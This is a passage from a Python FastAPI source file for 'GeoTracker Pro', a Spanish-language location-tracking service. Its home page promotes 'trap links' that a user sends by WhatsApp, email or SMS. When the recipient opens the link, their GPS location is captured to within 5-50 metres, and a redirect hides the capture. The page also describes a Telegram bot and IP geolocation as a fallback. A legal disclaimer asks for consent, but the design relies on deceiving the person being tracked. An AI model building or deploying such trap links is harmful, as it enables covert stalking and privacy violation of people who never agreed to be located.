            // Cargar al inicio
            loadData();
            
            // Auto-refresh cada 30 segundos
            setInterval(loadData, 30000);
        </script>
    </body>
    </html>
    """)

# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════

async def get_ip_info(ip: str) -> Dict[str, Any]:
    """Obtener información geográfica de una IP"""
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(f"http://ip-api.com/json/{ip}")
            data = r.json()
            if data["status"] == "success":
                return {
                    "country": data.get("country"),
                    "city": data.get("city"),
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "isp": data.get("isp")
                }
    except:
        pass
    return {}

# ═══════════════════════════════════════════════════════════════════
# PÁGINA DE INICIO
# ═══════════════════════════════════════════════════════════════════

@app.get(
    "/",
    response_class=HTMLResponse,
    tags=["📊 Consultas y Estadísticas"],
    summary="Página de inicio",
    description="Página principal con instrucciones de uso del sistema"
)
async def home():
    """Página de inicio con instrucciones"""
    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html>
    <head>
        <title>GeoTracker Pro - Sistema de Rastreo</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                max-width: 900px;
                background: white;
                border-radius: 20px;
                padding: 50px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            h1 {
                color: #667eea;
                font-size: 3em;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                font-size: 1.3em;
                margin-bottom: 40px;
            }
            .methods {
                display: grid;
                gap: 25px;
                margin: 40px 0;
            }
            .method {
                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                padding: 25px;
                border-radius: 15px;
                border-left: 5px solid #667eea;
            }
            .method h3 {
                color: #667eea;
                margin-bottom: 10px;
                font-size: 1.5em;
            }
            .method p {
                color: #555;
                line-height: 1.6;
            }
            .method code {
                background: #fff;
                padding: 10px;
                border-radius: 5px;
                display: block;
                margin-top: 10px;
                font-size: 0.9em;
                overflow-x: auto;
            }
            .buttons {
                display: flex;
                gap: 15px;
                margin-top: 40px;
                flex-wrap: wrap;
            }
            .btn {
                background: #667eea;
                color: white;
                padding: 15px 30px;
                border-radius: 10px;
                text-decoration: none;
                font-weight: 600;
                font-size: 1.1em;
                transition: all 0.3s;
                display: inline-block;
            }
            .btn:hover {
                background: #5568d3;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            }
            .btn-secondary {
                background: #6c757d;
            }
            .btn-secondary:hover {
                background: #5a6268;
            }
            .warning {
                background: #fff3cd;
                border: 2px solid #ffc107;
                border-radius: 10px;
                padding: 20px;
                margin: 30px 0;
            }
            .warning h4 {
                color: #856404;
                margin-bottom: 10px;
            }
            .warning p {
                color: #856404;
                line-height: 1.6;
            }
            .features {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            .feature {
                text-align: center;
                padding: 20px;
            }
            .feature-icon {
                font-size: 3em;
                margin-bottom: 10px;
            }
            .feature h4 {
                color: #333;
                margin-bottom: 5px;
            }
            .feature p {
                color: #666;
                font-size: 0.9em;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 GeoTracker Pro</h1>
            <p class="subtitle">Sistema Profesional de Rastreo Geográfico Sin App Móvil</p>
            
            <div class="features">
                <div class="feature">
                    <div class="feature-icon">📍</div>
                    <h4>GPS Preciso</h4>
                    <p>5-50m de precisión</p>
                </div>
                <div class="feature">
                    <div class="feature-icon">🔗</div>
                    <h4>Links Trampa</h4>
                    <p>Captura automática</p>
                </div>
                <div class="feature">
                    <div class="feature-icon">📊</div>
                    <h4>Dashboard</h4>
                    <p>Visualización en tiempo real</p>
                </div>
                <div class="feature">
                    <div class="feature-icon">🤖</div>
                    <h4>Telegram Bot</h4>
                    <p>Integración completa</p>
                </div>
            </div>
            
            <h2 style="color: #333; margin-top: 40px; margin-bottom: 20px;">📝 Métodos Disponibles</h2>
            
            <div class="methods">
                <div class="method">
                    <h3>1️⃣ Link Trampa (Más Efectivo)</h3>
                    <p><strong>Crear un link:</strong></p>
                    <code>/crear-enlace?nombre=Juan&telefono=573001234567&redirigir_a=https://youtube.com</code>
                    <p style="margin-top: 15px;">
                        ✅ <strong>Ventajas:</strong> Captura automática, alta tasa de éxito (70-85%)<br>
                        📊 <strong>Precisión:</strong> 5-50 metros<br>
                        🎯 <strong>Uso:</strong> Envía el link por WhatsApp/Email/SMS
                    </p>
                </div>
                
                <div class="method">
                    <h3>2️⃣ Bot de Telegram</h3>
                    <p><strong>Configurar webhook:</strong></p>
                    <code>https://api.telegram.org/bot&lt;TOKEN&gt;/setWebhook?url=https://tu-dominio.com/telegram-webhook</code>
                    <p style="margin-top: 15px;">
                        ✅ <strong>Ventajas:</strong> Muy preciso, fácil de usar<br>
                        📊 <strong>Precisión:</strong> 5-20 metros<br>
                        ⚠️ <strong>Limitación:</strong> Usuario debe compartir manualmente
                    </p>
                </div>
                
                <div class="method">
                    <h3>3️⃣ Geolocalización por IP</h3>
                    <p>Método automático de respaldo cuando GPS no está disponible</p>
                    <p style="margin-top: 15px;">
                        ⚠️ <strong>Precisión:</strong> 50-200 km (ciudad aproximada)<br>
                        🔧 <strong>Uso:</strong> Automático en todos los métodos
                    </p>
                </div>
            </div>
            
            <div class="warning">
                <h4>⚠️ ADVERTENCIA LEGAL IMPORTANTE</h4>
                <p>
                    Este sistema debe usarse <strong>ÚNICAMENTE</strong> con consentimiento explícito 
                    de las personas rastreadas. El uso sin autorización puede constituir delito de 
                    violación de privacidad según el código penal local.
                </p>
                <p style="margin-top: 10px;">
                    ✅ <strong>Usos legales:</strong> Rastreo familiar con consentimiento, localización 
                    de empleados (con contrato), fines académicos en ambiente controlado.
                </p>
            </div>
            
            <div class="buttons">
                <a href="/docs" class="btn">📚 Documentación API (Swagger)</a>
                <a href="/dashboard" class="btn btn-secondary">📊 Ver Dashboard</a>
            </div>
        </div>
    </body>
    </html>
    """)

# ═══════════════════════════════════════════════════════════════════
# EJECUTAR SERVIDOR
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import uvicorn
    print("\n" + "═" * 80)
    print("🎯 GEOTRACKER PRO - Sistema de Rastreo Iniciado")
    print("═" * 80)
    print("📚 Swagger UI:  http://localhost:10000/docs")
    print("📊 Dashboard:   http://localhost:10000/dashboard")
    print("🏠 Inicio:      http://localhost:10000")
    print("═" * 80 + "\n")
    uvicorn.run(app, host="0.0.0.0", port=10000)